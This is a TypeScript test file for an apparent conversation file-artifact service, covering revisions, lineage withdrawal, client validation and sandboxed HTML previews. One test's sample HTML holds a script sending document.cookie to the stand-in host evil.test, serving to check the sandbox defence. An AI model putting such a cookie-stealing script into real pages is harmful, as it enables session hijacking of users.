import { afterEach, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { composedFixture } from "./fixtures/s15-composition";
import type { FileArtifact, FileReceipt, FileUpload } from "../src/s16/files/types";
import type { ConversationFileCommand } from "../src/s15/conversation/types";
import type { ClientArtifactDetail, ClientArtifactList } from "../src/s16/client/contracts";
import { groundConversationIntent } from "../src/s15/conversation/intent";
import { artifactPreviewPolicy } from "../src/s16/http";
import { artifactDetail } from "../src/s16/artifacts";
import type { FileArtifact as Artifact } from "../src/s16/files/types";
import { JitClient } from "../src/s16/client";
import { en } from "../src/i18n/en";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { DurableJournal } from "../src/s15/durable-journal";
import { th } from "../src/i18n/th";

const fixtures: Awaited<ReturnType<typeof composedFixture>>[] = [];
afterEach(async () => { for (const f of fixtures.splice(0)) await f.close(); });
const hash = (text: string | Uint8Array) => createHash("sha256").update(text).digest("hex");
const revise = "Review the attached file. Changes: keep only the launch line. Then create a revised Markdown file.";
const iframe = { "sec-fetch-dest": "iframe", "sec-fetch-site": "same-origin", "sec-fetch-mode": "navigate" };
async function fixture() {
  const f = await composedFixture("default", false, undefined, options => {
    for (const rule of options.proposedPolicy!.rules) { if (!rule.adapters.includes("s16_files")) rule.adapters.push("s16_files"); if (!rule.operations.includes("artifact_create")) rule.operations.push("artifact_create"); }
    return { ...options, files: {} };
  }); fixtures.push(f); return f;
}
type F = Awaited<ReturnType<typeof fixture>>;
async function upload(f: F, text: string, requestId = "upload1", name = "notes.txt"): Promise<FileReceipt> {
  const response = await f.request("/api/s16/client/conversations/conversation/uploads", "POST", { requestId, conversationId: "conversation", name, bytes: Buffer.byteLength(text), sha256: hash(text) });
  expect(response.status).toBe(201); const pending = await response.json() as FileUpload;
  const written = await (await f.raw(`/api/s16/client/uploads/${pending.id}/bytes`, text)).json() as FileUpload;
  expect(written.state).toBe("ready"); return written.receipt!;
}
const message = (requestId: string, file: { id: string; sha256: string }, text = "Summarize these notes and create a downloadable Markdown brief."): ConversationFileCommand => ({ contract: "s16-conversation/v2", requestId, conversationId: "conversation", text, continuation: null, files: [{ id: file.id, sha256: file.sha256 }] });
async function produce(f: F, input: ConversationFileCommand, output: { name: string; text: string }, read = true) {
  f.script = [...(read ? [{ type: "tool_call" as const, id: "read_" + input.requestId, name: "file_read", arguments: { id: input.files[0]!.id, offset: 0 } }] : []), { type: "tool_call", id: "create_" + input.requestId, name: "file_create", arguments: output }];
  const sent = await f.request("/api/s16/client/conversations/conversation/messages", "POST", input); expect(sent.status).toBe(202);
  await f.service.conversation.drain(); return f.service.conversation.view(f.owner, input.requestId);
}
const list = async (f: F, search = "") => { const response = await f.request(`/api/s16/client/artifacts${search}`); expect(response.status).toBe(200); return await response.json() as ClientArtifactList; };
const download = (f: F, artifact: FileArtifact) => f.request(`/api/s16/client/requests/${artifact.requestId}/artifacts/${artifact.id}`);
async function adopt(f: F, artifact: FileArtifact, requestId = "adopt1") {
  const response = await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId, conversationId: artifact.conversationId, sha256: artifact.sha256 });
  expect(response.status).toBe(201); return await response.json() as FileUpload;
}
/** Original brief → restart → adopted exact bytes → a second immutable revision. */
async function revised(f: F) {
  const notes = await upload(f, "Launch: Friday.\nPrivate marker: marigold.\n");
  const first = await produce(f, message("message1", notes), { name: "brief.md", text: "# Brief\nLaunch: Friday.\nOwner: Ana.\n" });
  expect(first.state).toBe("completed"); const original = first.artifacts![0]!;
  await f.reopen();
  f.advance(1000); const input = await adopt(f, original);
  const second = await produce(f, message("message2", input.receipt!, revise), { name: "brief.md", text: "# Brief\nLaunch: Friday.\n" });
  expect(second.state).toBe("completed"); return { notes, original, input, revision: second.artifacts![0]!, second };
}

test("the library lists only committed current artifacts and a revision after restart is a distinct immutable object", async () => {
  const f = await fixture(), notes = await upload(f, "Launch: Friday.\n", "upload0");
  // Uncommitted output: file_create succeeded, completion failed for missing read coverage.
  const failed = await produce(f, message("message0", notes), { name: "draft.md", text: "# Draft\n" }, false);
  expect(failed.state).not.toBe("completed"); expect(f.service.files!.lineage(f.owner)).toHaveLength(1);
  expect((await list(f)).items).toEqual([]);
  const { original, input, revision, second } = await revised(f);
  expect(revision.id).not.toBe(original.id); expect(revision.sha256).not.toBe(original.sha256);
  const before = new Uint8Array(await (await download(f, original)).arrayBuffer()), after = new Uint8Array(await (await download(f, revision)).arrayBuffer());
  expect(new TextDecoder().decode(before)).toBe("# Brief\nLaunch: Friday.\nOwner: Ana.\n"); expect(hash(before)).toBe(original.sha256);
  expect(new TextDecoder().decode(after)).toBe("# Brief\nLaunch: Friday.\n"); expect(hash(after)).toBe(revision.sha256);
  // The revision request read the exact parent bytes through the ordinary guarded file tool.
  expect(input.receipt!.sha256).toBe(original.sha256); expect(f.modelPrompts.join()).toContain("Owner: Ana.");
  expect(second.evidence.some(e => e.tool === "file_read" && e.content.includes(input.id))).toBe(true);
  const page = await list(f);
  expect(page.items.map(item => [item.artifact.id, item.revision, item.parent])).toEqual([[revision.id, 2, original.id], [original.id, 1, null]]);
  expect(page.items[1]!.label).toBe("Summarize these notes and create a downloadable Markdown brief."); expect(page.next).toBeNull();
  const detail = await (await f.request(`/api/s16/client/artifacts/${revision.id}`)).json() as ClientArtifactDetail;
  expect(detail).toMatchObject({ contract: "s16-client-artifact/v1", preview: "escaped_text", inputs: [{ id: input.id, name: "brief.md", sha256: original.sha256, origin: original.id }] });
  expect(detail.revisions.map(item => item.artifact.id)).toEqual([original.id, revision.id]);
  expect((await (await f.request(`/api/s16/client/artifacts/${original.id}`)).json() as ClientArtifactDetail).revisions.map(item => item.revision)).toEqual([1, 2]);
  // Search/type/conversation filters run before paging; cursors name a position only.
  expect((await list(f, "?q=BRIEF&type=markdown&conversation=conversation")).items).toHaveLength(2);
  expect((await list(f, "?type=html")).items).toEqual([]);
  expect((await list(f, `?before=${revision.createdAt}.${revision.id}`)).items.map(item => item.artifact.id)).toEqual([original.id]);
  for (const bad of ["?page=2", "?q=a&q=b", "?type=pdf", "?conversation=../x"]) expect((await f.request(`/api/s16/client/artifacts${bad}`)).status).toBe(400);
  expect((await f.request("/api/s16/client/artifacts?before=x")).status).toBe(409);
  // A revision never mutates the original after a further restart.
  await f.reopen(); expect(hash(new Uint8Array(await (await download(f, original)).arrayBuffer()))).toBe(original.sha256);
});

test("adopting an artifact is exact, idempotent and confined to its own conversation; it starts no work", async () => {
  const f = await fixture(), notes = await upload(f, "Launch: Friday.\n"), row = await produce(f, message("message1", notes), { name: "brief.md", text: "# Brief\n" });
  const artifact = row.artifacts![0]!, calls = f.modelPrompts.length;
  const first = await adopt(f, artifact), again = await adopt(f, artifact);
  expect(again.id).toBe(first.id); expect(first).toMatchObject({ state: "ready", conversationId: "conversation", receipt: { contract: "s16-file-receipt/v1", sha256: artifact.sha256, name: "brief.md" } });
  expect(f.modelPrompts.length).toBe(calls);
  // Rollback fence: a reader without parent-chain enforcement refuses the journal once a copy exists.
  const journal = join(f.directory, "files.sqlite"); expect(readFileSync(journal).readUInt32BE(60)).toBe(3);
  expect(() => new DurableJournal(journal, "fixture", false, 0x4a495446, undefined, [1, 2])).toThrow("continuity_unavailable");
  const changed = await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId: "adopt1", conversationId: "conversation", sha256: "0".repeat(64) });
  expect(changed.status).toBe(409);
  expect((await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId: "adopt2", conversationId: "other", sha256: artifact.sha256 })).status).toBe(403);
  expect((await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId: "adopt3", conversationId: "conversation", sha256: artifact.sha256, extra: 1 })).status).toBe(400);
  expect((await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId: "adopt4", conversationId: "conversation", sha256: artifact.sha256 }, { "x-csrf-token": "wrong" })).status).toBe(403);
  expect((await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId: "adopt5", conversationId: "conversation", sha256: artifact.sha256 }, { origin: "http://evil.test" })).status).toBe(403);
  expect((await f.request(`/api/s16/client/artifacts`, "GET", undefined, { cookie: "" })).status).toBe(401);
  // Withdrawing the adopted copy affects only the next message; the delivered parent stays available.
  await f.request(`/api/s16/client/uploads/${first.id}/withdraw`, "POST", {});
  expect((await download(f, artifact)).status).toBe(200); expect((await list(f)).items).toHaveLength(1);
});

test("withdrawing an ancestor blocks every descendant in search, detail, preview, download, revision and stale cursors", async () => {
  const f = await fixture(), { notes, original, input, revision } = await revised(f);
  const cursor = `?before=${revision.createdAt}.${revision.id}`;
  expect((await list(f, cursor)).items).toHaveLength(1);
  const pending = await adopt(f, revision, "adopt_pending");
  await f.request(`/api/s16/client/uploads/${notes.id}/withdraw`, "POST", {});
  expect((await list(f)).items).toEqual([]); expect((await list(f, cursor)).items).toEqual([]);
  for (const artifact of [original, revision]) {
    expect((await f.request(`/api/s16/client/artifacts/${artifact.id}`)).status).toBe(409);
    expect((await download(f, artifact)).status).toBe(409);
    expect((await f.request(`/api/s16/client/artifacts/${artifact.id}/inputs`, "POST", { requestId: "adopt_late_" + artifact.id, conversationId: "conversation", sha256: artifact.sha256 })).status).toBe(409);
  }
  // Inputs copied from descendants are withdrawn too, without a second write, and cannot start work.
  for (const id of [input.id, pending.id]) expect(await (await f.request(`/api/s16/client/uploads/${id}`)).json()).toMatchObject({ state: "withdrawn", code: "lineage_withdrawn" });
  const refused = await f.request("/api/s16/client/conversations/conversation/messages", "POST", message("message3", pending.receipt!, revise));
  expect(refused.status).toBe(409);
  const snapshot = await (await f.request("/api/s16/client/conversations/conversation")).json();
  expect(snapshot.conversation.rows.flatMap((row: { files?: { artifacts: unknown[] } }) => row.files?.artifacts ?? [])).toEqual([]);
  await f.reopen(); expect((await list(f)).items).toEqual([]);
});

test("withdrawal after an accepted revision request blocks the revision before any model stream", async () => {
  const f = await fixture(), notes = await upload(f, "Launch: Friday.\n"), row = await produce(f, message("message1", notes), { name: "brief.md", text: "# Brief\n" });
  const input = await adopt(f, row.artifacts![0]!), calls = f.modelPrompts.length;
  f.script = [{ type: "tool_call", id: "read2", name: "file_read", arguments: { id: input.id, offset: 0 } }, { type: "tool_call", id: "create2", name: "file_create", arguments: { name: "brief.md", text: "# Brief v2\n" } }];
  f.service.conversation.submit(f.owner, message("message2", input.receipt!, revise));
  await f.request(`/api/s16/client/uploads/${notes.id}/withdraw`, "POST", {});
  await f.service.conversation.drain();
  const view = f.service.conversation.view(f.owner, "message2");
  expect(view.state).not.toBe("completed"); expect(view.artifacts ?? []).toEqual([]); expect(f.modelPrompts.length).toBe(calls);
  expect(f.service.files!.lineage(f.owner).filter(entry => entry.artifact.requestId === "message2")).toEqual([]);
  expect((await list(f)).items).toEqual([]);
});

test("an HTML artifact previews only as an opaque, script-free iframe document and downloads as an attachment", async () => {
  const f = await fixture(), notes = await upload(f, "Launch: Friday.\n");
  const html = "<!doctype html><title>Brief</title><style>p{color:#b00}</style><p>Launch: Friday.</p><script>fetch('http://evil.test/'+document.cookie);parent.postMessage('x','*')</script><img src=\"http://evil.test/pixel\"><form action=\"http://evil.test/\"><button>Send</button></form>";
  const row = await produce(f, message("message1", notes), { name: "brief.html", text: html });
  const artifact = row.artifacts![0]!; expect(artifact.mime).toBe("text/html");
  const boot = await (await f.request("/api/s16/client/bootstrap")).json();
  expect(boot.capabilities.artifacts).toEqual({ available: true, preview: "escaped_text", library: "s16-client-artifacts/v1", revisions: true, html: "sandboxed_static" });
  const path = `/api/s16/client/requests/message1/artifacts/${artifact.id}/preview`;
  expect((await f.request(path)).status).toBe(403);
  expect((await f.request(path, "GET", undefined, { ...iframe, "sec-fetch-site": "same-site" })).status).toBe(403);
  expect((await f.request(path, "GET", undefined, { ...iframe, "sec-fetch-dest": "document" })).status).toBe(403);
  const preview = await f.request(path, "GET", undefined, iframe), bytes = new Uint8Array(await preview.arrayBuffer());
  expect(preview.status).toBe(200); expect(preview.headers.get("content-type")).toBe("text/html; charset=utf-8");
  expect(preview.headers.get("content-security-policy")).toBe(artifactPreviewPolicy);
  expect(artifactPreviewPolicy).toStartWith("sandbox;"); expect(artifactPreviewPolicy).not.toContain("allow-"); expect(artifactPreviewPolicy).toContain("default-src 'none'");
  expect(preview.headers.get("x-content-sha256")).toBe(artifact.sha256); expect(hash(bytes)).toBe(artifact.sha256);
  const attachment = await f.request(`/api/s16/client/requests/message1/artifacts/${artifact.id}`);
  expect(attachment.headers.get("content-type")).toBe("application/octet-stream"); expect(attachment.headers.get("content-disposition")).toContain("attachment;");
  expect((await list(f, "?type=html")).items.map(item => item.artifact.id)).toEqual([artifact.id]);
  expect((await (await f.request(`/api/s16/client/artifacts/${artifact.id}`)).json()).preview).toBe("sandboxed_html");
  const page = await f.request("/s16/artifacts");
  expect(page.status).toBe(200); expect(page.headers.get("content-security-policy")).toContain("frame-src 'self'"); expect(page.headers.get("content-security-policy")).toContain("frame-ancestors 'none'");
  // Non-HTML artifacts have no HTML viewer; a withdrawn source closes the viewer too.
  const markdown = await produce(f, message("message2", notes), { name: "brief.md", text: "# Brief\n" });
  expect((await f.request(`/api/s16/client/requests/message2/artifacts/${markdown.artifacts![0]!.id}/preview`, "GET", undefined, iframe)).status).toBe(409);
  await f.request(`/api/s16/client/uploads/${notes.id}/withdraw`, "POST", {});
  expect((await f.request(path, "GET", undefined, iframe)).status).toBe(409);
});

test("the shared client validates library, detail and adoption responses without retrying", async () => {
  const f = await fixture(), notes = await upload(f, "Launch: Friday.\n"), row = await produce(f, message("message1", notes), { name: "brief.md", text: "# Brief\n" });
  let posts = 0;
  const client = new JitClient({ origin: "http://localhost:3099", async fetch(request) {
    const url = new URL(request.url); if (request.method === "POST") posts++;
    return f.request(url.pathname + url.search, request.method, request.method === "POST" ? await request.json() : undefined, Object.fromEntries(request.headers));
  } });
  await client.bootstrap();
  const page = await client.artifacts({ q: "", type: "all", conversation: null, before: null });
  expect(page.items.map(item => item.artifact.id)).toEqual([row.artifacts![0]!.id]);
  const detail = await client.artifact(row.artifacts![0]!.id); expect(detail.inputs[0]).toMatchObject({ id: notes.id, origin: null });
  const input = await client.artifactInput(detail.item.artifact.id, { requestId: "adopt1", conversationId: "conversation", sha256: detail.item.artifact.sha256 });
  expect(input.receipt!.sha256).toBe(detail.item.artifact.sha256); expect(posts).toBe(1);
  expect(client.artifactPreviewUrl(detail.item.artifact)).toBe(`http://localhost:3099/api/s16/client/requests/message1/artifacts/${detail.item.artifact.id}/preview`);
  await expect(client.artifactInput(detail.item.artifact.id, { requestId: "adopt2", conversationId: "conversation", sha256: "0".repeat(64) })).rejects.toMatchObject({ code: "artifact_unavailable", outcome: "response" });
});

test("lineage checks stay linear when two copies of each revision feed the next one", async () => {
  const f = await fixture(), notes = await upload(f, "Launch: Friday.\n");
  let artifact = (await produce(f, message("message0", notes), { name: "brief.md", text: "# Brief 0\n" })).artifacts![0]!;
  for (let level = 1; level <= 8; level++) {
    f.advance(10);
    const copies = [await adopt(f, artifact, `adopt_${level}_a`), await adopt(f, artifact, `adopt_${level}_b`)];
    f.script = [...copies.map((copy, index) => ({ type: "tool_call" as const, id: `read_${level}_${index}`, name: "file_read", arguments: { id: copy.id, offset: 0 } })), { type: "tool_call", id: `create_${level}`, name: "file_create", arguments: { name: "brief.md", text: `# Brief ${level}\n` } }];
    const command: ConversationFileCommand = { contract: "s16-conversation/v2", requestId: `message${level}`, conversationId: "conversation", text: revise, continuation: null, files: copies.map(copy => ({ id: copy.id, sha256: copy.receipt!.sha256 })) };
    expect((await f.request("/api/s16/client/conversations/conversation/messages", "POST", command)).status).toBe(202); await f.service.conversation.drain();
    const row = f.service.conversation.view(f.owner, command.requestId); expect(row.state).toBe("completed"); artifact = row.artifacts![0]!;
  }
  const top = await adopt(f, artifact, "adopt_top"), journal = f.service.files!.journal, get = journal.get.bind(journal); let reads = 0;
  journal.get = ((id: string) => { reads++; return get(id); }) as typeof journal.get;
  try { expect((await (await f.request(`/api/s16/client/uploads/${top.id}`)).json()).state).toBe("ready"); } finally { journal.get = get; }
  // 2^8 paths without reuse; each upload/artifact is read about once with it.
  expect(reads).toBeLessThan(80);
  const detail = await (await f.request(`/api/s16/client/artifacts/${artifact.id}`)).json() as ClientArtifactDetail;
  expect(detail.item.revision).toBe(9); expect(detail.revisions.map(item => item.revision)).toEqual([1, 2, 3, 4, 5, 6, 7, 8, 9]);
  await f.request(`/api/s16/client/uploads/${notes.id}/withdraw`, "POST", {});
  expect(await (await f.request(`/api/s16/client/uploads/${top.id}`)).json()).toMatchObject({ state: "withdrawn", code: "lineage_withdrawn" });
});

test("a large sibling family is bounded to the viewed file, its ancestors and the newest others", () => {
  const sha = (n: number) => n.toString(16).padStart(64, "0"), art = (n: number): Artifact => ({ contract: "s16-file-artifact/v1", id: `artifact_${n}`, sha256: sha(n), requestId: `r${n}`, workId: `w${n}`, conversationId: "conversation", name: "brief.md", mime: "text/markdown", bytes: 1, createdAt: n });
  const lineage = Array.from({ length: 301 }, (_, n) => ({ artifact: art(n), inputs: [{ id: `file_${n}`, sha256: sha(1000 + n) }], parents: n ? [{ id: "artifact_0", sha256: sha(0) }] : [], current: true })).reverse();
  const files = { lineage: () => lineage, status: (_actor: unknown, id: string) => ({ state: "ready", receipt: { name: "notes.txt", mime: "text/plain", bytes: 1, sha256: sha(1000 + Number(id.slice(5))) } }), origin: () => null };
  const app = { view: (_actor: unknown, requestId: string) => { const n = Number(requestId.slice(1)); return { state: "completed", result: "ok", authority: { id: `w${n}` }, receipt: { rootRequestId: requestId, conversationId: "conversation" }, artifacts: [art(n)], command: { text: "Make a brief" } }; } };
  const detail = artifactDetail(app as never, files as never, {}, "artifact_5");
  expect(detail.familyTotal).toBe(301); expect(detail.revisions).toHaveLength(256);
  const ids = detail.revisions.map(item => item.artifact.id);
  expect(ids).toContain("artifact_0"); expect(ids).toContain("artifact_5"); expect(ids).toContain("artifact_300"); expect(ids).not.toContain("artifact_6");
});

test("narrow revision deliverable grammar recognizes explicit revised files only", () => {
  for (const text of [revise, "Review the attached page and then create a revised HTML file.", "อ่านไฟล์ที่แนบ สิ่งที่ต้องแก้: ให้สั้นลง แล้วสร้างไฟล์ฉบับแก้ไข", "ตรวจไฟล์นี้แล้วสร้างไฟล์ html ฉบับปรับปรุง"]) expect(groundConversationIntent(text, { fileOutput: true }).kind).toBe("execute");
  for (const text of ["If it looks fine, " + revise, "Review the attached file and delete the original and create a revised file.", revise + " Also email it to Ana."]) expect(groundConversationIntent(text, { fileOutput: true }).kind).not.toBe("execute");
  expect(groundConversationIntent(revise).kind).not.toBe("execute");
  // The client's editable revision template is itself an explicit terminal deliverable in both languages.
  for (const copy of [en, th]) for (const changes of ["", "keep only the launch line", "ให้สั้นลง"]) expect(groundConversationIntent(copy["s16.artifact.reviseStart"] + changes + copy["s16.artifact.reviseEnd"], { fileOutput: true }).kind).toBe("execute");
});
